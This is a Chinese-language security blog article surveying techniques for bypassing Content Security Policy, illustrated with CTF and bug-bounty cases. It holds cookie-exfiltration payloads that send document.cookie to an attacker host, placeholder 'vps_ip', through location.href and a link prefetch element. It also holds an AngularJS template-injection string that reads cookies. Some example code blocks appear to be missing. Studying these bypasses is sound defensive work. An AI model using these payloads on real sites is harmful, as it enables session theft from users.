**Author: evoA@Syclover**
## CSP简介
内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。  
当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。  
CSP的具体介绍可以看看手册[内容安全策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP)
## CSP的绕过
CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充
### location.href
CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用  
当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上
    location.href = "vps_ip:xxxx?"+document.cookie
有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333  
利用条件:
  1. 可以执行任意JS脚本，但是由于CSP无法数据带外
### link标签导致的绕过
这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了  
因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。  
所以我们可以通过此标签将数据带外
当然这个是我们写死的标签，如何把数据带外？
    var link = document.createElement("link");
    link.setAttribute("rel", "prefetch");
    link.setAttribute("href", "//vps_ip/?" + document.cookie);
    document.head.appendChild(link);
这样就可以把cookie带外了  
利用条件:
  1. 可以执行任意JS脚本，但是由于CSP无法数据带外
### 使用Iframe绕过
当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效  
A页面:
    flag{0xffff}
B页面:
setTimeout是为了等待iframe加载完成  
利用条件:
  1. 一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞
  2. 我们需要的数据在存在CSP保护的页面
### 用CDN来绕过
一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险  
这里给出orange师傅绕hackmd CSP的文章[Hackmd XSS](https://paper.seebug.org/855/)  
案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下
        {{constructor.constructor('alert(document.cookie)')()}}
这个是存在低版本angular js的cdn服务商列表  
除了低版本angular js的模板注入，还有许多库可以绕过CSP  
下面引用  
如果用了Jquery-mobile库，且CSP中包含"script-src 'unsafe-eval'"或者"script-src 'strict-dynamic'"，可以用此exp
还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie
blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库  
利用条件:
  1. CDN服务商存在某些低版本的js库
  2. 此CDN服务商在CSP白名单中
### 站点可控静态资源绕过
给一个绕过codimd的(实例)[codimd
xss](https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md)  
案例中codimd的CSP中使用了`www.google-analytics.com`  
而www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP  
同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过  
利用条件:
  1. 站点存在可控静态资源
  2. 站点在CSP白名单中
### 站点可控JSONP绕过
JSONP的详细介绍可以看看我之前的一篇文章  
大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析  
以ins'hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了www.google.com
    Content-Security-Policy: script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline'
看上去非常天衣无缝，但是google站点存在了用户可控jsonp
配合注释符，我们即可执行任意js  
下面是一些存在用户可控资源或者jsonp比较常用站点的github项目  
利用条件:
  1. 站点存在可控Jsonp
  2. 站点在CSP白名单中
### Base-uri绕过
第一次知道base-uri绕过是RCTF 2018 rBlog的非预期解[https://blog.cal1.cn/post/RCTF 2018 rBlog
writeup](https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup)  
当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用``标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径  
exp
注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内